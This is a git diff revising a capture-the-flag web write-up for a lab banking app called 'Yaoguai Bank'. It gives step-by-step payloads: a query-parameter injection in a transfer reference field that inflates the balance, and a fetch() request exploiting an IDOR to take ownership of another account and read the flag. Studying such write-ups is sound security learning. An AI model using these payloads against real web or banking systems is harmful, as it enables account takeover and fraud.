@@ -314,106 +314,132 @@ if __name__ == '__main__':
 ---
 # Yaoguai Bank
 
-This challenge involved exploiting two key vulnerabilities in a banking application to access a flag stored as the name of a low-numbered account.
+### Step 1: Register an Account
+- Visit register.html
+- Create an account with any email/password
 
-After reviewing the codebase, two critical vulnerabilities were identified:
+### Step 2: Exploit Parameter Pollution to Gain Premium Status
+- Log in to your new account
+- Navigate to Transfer page (/front/transfer.html)
 
-1. **Parameter Injection in the Transfer Function**: The `reference_number` parameter wasn't properly sanitized
-2. **Authorization Flaw in Sub-User Management**: The `editSubUser` function allowed changing ownership of any sub-user
+Create a transfer with:
+- Create a second account and use its account number
+- Amount: Any small amount like 10
+- Reference Number: whatever&amount=20000000
+- When the request reaches TransactionService.php, the URL becomes:
 
-The key to the challenge was in `SubUser.php`:
-
-```java
-<?php
-*if*($this->*getAccountNumber*()<10000000){
-$this->*setName*($_ENV['FLAG']);
-}
+```
+http://internal-services:5000/transfer?reference_number=whatever&amount=20000000&from_account=YOUR_ACCOUNT&to_account=DEST_ACCOUNT&amount=100
 ```
 
-This meant any sub-user with an account number under 10 million would have the flag as its name.
+Flask's `request.args.get('amount')` takes the first occurrence (20000000), giving you a large balance
 
-## **Exploitation Steps**
-
-### Step 1: Register a Normal Account
-
-- Created a standard user account through the registration form
-- This gave us a regular account with a high account number (>10,000,000)
-
-### Step 2: Gain Premium Status via Parameter Injection
-
-The vulnerability was in `TransactionService.php`:
-
-```java
-<?php
-$url = "$internalApiUrl?reference_number=$reference&from_account=$fromAccount&to_account=$toAccount&amount=$amount";
-```
-
-The `reference_number` parameter was directly inserted into the URL without sanitization, allowing parameter injection.
-
-- Sent a POST request to `/api/transfer.php` with:
-
-```java
-POST /api/transfer.php HTTP/1.1
-Host: 34.65.29.51:1280
-Content-Length: 86
-Accept-Language: en-US,en;q=0.9
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
-Content-Type: application/json
-Origin: http://34.65.29.51:1280
-Referer: http://34.65.29.51:1280/front/transfer.html
-Accept-Encoding: gzip, deflate, br
-Cookie: PHPSESSID=c602ac599441a618a3ed15edb7afe805
-Connection: keep-alive
-
-{
-"to_account":"47803125","amount":"1","reference_number":"whatever&amount=20000000"}
-```
-
-- This created a request to the internal API:
-
-`http://internal-services:5000/transfer?reference_number=whatever&amount=20000000&from_account=...&to_account=12345&amount=100`
-
-- The API used the first `amount` parameter (20000000), giving us a large balance
-- The `checkPremium` function automatically upgraded our account to premium status
-
+The `checkPremium()` function automatically promotes you to premium
 ![image.png](./Aswan%20CTF%20Web%20Writeups/Yaoguai%20Bank/image.png)
 
-### Step 3: Exploit Sub-User Ownership
 
-From examining the code and database, we knew:
+### Step 3: Exploit the IDOR Vulnerability
 
-- Account 500 (with ID 9050) existed and had an account number < 10,000,000
-- The EditSubUser.php endpoint had an authorization flaw
-
-Made a POST request to EditSubUser.php:
-
-```java
-{
-"id": 9050,
-"newName": "test"
+Looking at the code in `[UsersRepository.php]`, we can see the problematic function:
+```php
+<?php
+public static function EnsureEditUserAuthority($id,$OwnerId){
+    $query = "UPDATE users SET OwnerId = ? WHERE UserId = ?";
+    $connection = DB::getInstance();
+    $statement = $connection->getConnection()->prepare($query);
+    $statement->bind_param("dd",$OwnerId,$id);
+    $statement->execute();
+    return $statement->get_result();
 }
 ```
 
-This executed `editSubUser` which called:
-
-```java
+Despite its name suggesting it's checking authorization, this function actually changes ownership in the database.
+In `[UserController.php]`, there are two contrasting implementations:
+```php
 <?php
-UsersRepository::*EnsureEditUserAuthority*($id, $OwnerId)
+// For changing passwords - HAS ownership verification
+public function changeSubUserPassword($data,$user){
+    // ... 
+    $userSub = $user->getOwnedUsers();
+    $validUser = false;
+    foreach($userSub as $entry){
+       if($entry['Id'] === $data['id']){
+           $validUser = true; // Verify ownership
+           break;
+       }
+    }
+    if(!$validUser) { /* Error */ }
+    // ...
+}
+
+// For editing sub-users - NO ownership verification!
+public function editSubUser($data,$user){
+    if(!isset($data['id']) || !isset($data['newName'])) {
+        http_response_code(400);
+        return json_encode(["status" => "error", "message" => "Enter All Fields"]);
+    }
+    
+    $service = new UsersService();
+    return $service->editSubUser($data['id'],$data['newName'],$user->getId());
+}
 ```
 
-This changed the ownership of account 500 to our account.
+The `editSubUser` function has no verification that you own the user you're trying to edit!
 
+How the Attack Works
+When we make our request in the console(you can use burp):
+```javascript
+fetch('../api/EditSubUser.php', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({
+    id: 9050,  // ID of account 500
+    newName: "test"
+  })
+})
+```
+This triggers a chain of calls:
+
+- `EditSubUser.php` receives our request
+- Calls `UserController->editSubUser()` with our data  
+- No ownership verification happens  
+- Calls `UsersService->editSubUser(9050, "test", YOUR_ID)`  
+- Calls `UsersRepository::EnsureEditUserAuthority(9050, YOUR_ID) ` 
+- The SQL that executes is:
+```sql
+UPDATE users SET OwnerId = YOUR_ID WHERE UserId = 9050
+```
+This changes the database record in the users table from:
+```
+UserId: 9050, OwnerId: 1
+```
+To:
+```
+UserId: 9050, OwnerId: YOUR_ID
+```
+Now account `500` (with ID `9050`) belongs to you as its `owner`, making you able to access it directly after changing its password.
 ![image.png](./Aswan%20CTF%20Web%20Writeups/Yaoguai%20Bank/image%201.png)
 
-### Step 4: Retrieve the Flag
 
-Once account 500 was under our ownership, refreshed the profile page to view our sub-users.
+### Step 4: Access the Sub-User to Get the Flag
+- From your profile page, you can now see account 500 as your sub-user
+- Change its password using the "Change Password" button
+- Log out and log in as account 500 using its email and your new password
+- The flag appears as the name due to the condition in `SubUser.php`:
+```php
+<?php
+if($this->getAccountNumber()<10000000){
+    $this->setName($_ENV['FLAG']);
+}
+```
+
+Once account 500 was under our ownership, refreshed the profile page to view our sub-users. You can see that we now have that subuser listed on our profile
 
 Change the password of that `Admin@yao.com`  and login
 
 ![image.png](./Aswan%20CTF%20Web%20Writeups/Yaoguai%20Bank/image%202.png)
 
+
 `YAO{b4nk_h3ck3d_cuz_greed}`
 
 ---
-
